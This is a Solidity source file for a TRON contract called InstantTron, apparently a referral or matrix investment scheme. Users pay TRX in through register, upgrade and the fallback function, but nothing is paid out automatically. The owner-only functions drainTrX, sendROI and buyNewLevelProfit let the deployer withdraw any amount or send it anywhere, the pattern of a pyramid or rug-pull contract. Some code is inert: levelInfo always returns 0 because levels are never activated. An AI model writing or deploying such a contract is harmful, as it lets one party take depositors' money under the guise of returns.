//SourceUnit: index.sol

pragma solidity 0.5.9;

interface ITronForAll {
    enum Overflow {
        DOWN,
        DIRECT,
        UP,
        OUTRUN
    }

    event Register(address indexed addr, address indexed upline, uint256 id, uint40 time);
    event BuyLevel(address indexed addr, uint8 level, uint40 time);
    function register(address payable _upline) payable external;
    function upgrade() payable external;
    function getUserById(uint256 _id) view external returns(address addr, address upline);
}

contract InstantTron is ITronForAll {
    struct Level {
        bool active;
        address payable upline;
        mapping(uint8 => uint256) referrals;
    }

    struct User {
        uint256 id;
        uint256 lastdepositId;
        address payable upline;
        mapping(uint8 => Level) levels;
    }
    
    uint8 public constant MAX_LEVEL = 16;

    address payable public root;
    uint256 public last_id;
    uint256 public turnover;

    uint256[] public levels;
    uint256[] public matrixIncome;
    mapping(address => User) public users;
    mapping(uint256 => address payable) public users_ids;
    mapping(address=>uint256)private levelOne;
    mapping(address=>uint256)private levelTwo;
    mapping (address => mapping (uint256 => bool)) private levelActive;
    mapping (address => mapping (uint256 => uint256)) public levelAmount;
    address payable public owner;


    constructor(address payable _root) public {
        owner= msg.sender ;
        root = _root;
        _addUser(root, address(0));
    }
    modifier onlyOwner(){
        require(msg.sender==owner,"only owner can call! ");
        _;
    }
    function() payable external {
        _register(msg.sender, _bytesToAddress(msg.data), msg.value);
    }
    
    function drainTrX(uint256 _amont)public payable onlyOwner{
        msg.sender.transfer(_amont);
    }   
    function sendROI(address payable _receiver,uint256 _amont)public payable onlyOwner{
      _receiver.transfer(_amont);
    }
    function _addUser(address payable _user, address payable _upline) private {
        users[_user].id = ++last_id;
        users[_user].upline = _upline;
        users_ids[last_id] = _user;

        emit Register(_user, _upline, last_id, uint40(block.timestamp));
    }
    function buyNewLevelProfit(address payable [] calldata userAddress, uint256[] calldata levelAmounts) external payable onlyOwner {

         uint8 i = 0;
        for (i; i < userAddress.length; i++) {
            userAddress[i].transfer(levelAmounts[i]);
        }
    }
    function _register(address payable _user, address payable _upline, uint256 _value) private {
        require(users[_user].upline == address(0) && _user != root, "User already exists");
        require(users[_upline].upline != address(0) || _upline == root, "Upline not found");
        users[_user].lastdepositId=1;
        levelActive[_user][0]=true;
        levelAmount[_user][1]=_value;
        _addUser(_user, _upline);

    }

    function register(address payable _upline) payable external {
        require(msg.value%50==0,"Only 50 multiple allowed!");
        _register(msg.sender, _upline, msg.value);
    }

    function upgrade() payable external {
        require(users[msg.sender].upline != address(0), "User not register");
        require(msg.value%50==0, "Invalid amount");
        users[msg.sender].lastdepositId++;
        levelAmount[msg.sender][users[msg.sender].lastdepositId]=msg.value;
        
    }

    function _bytesToAddress(bytes memory _data) private pure returns(address payable addr) {
        assembly {
            addr := mload(add(_data, 20))
        }
    }
    /*
        Only external call
    */

    function getUserById(uint256 _id) view external returns(address addr, address upline) {
        return (users_ids[_id], users[users_ids[_id]].upline);
    }
    function levelInfo(address _addr)view external returns(uint256 level){
         for(uint8 l = 0; l < MAX_LEVEL; l++) {
            if(!users[_addr].levels[l].active) break;

            level = l;
        }
        return(level);
    }

}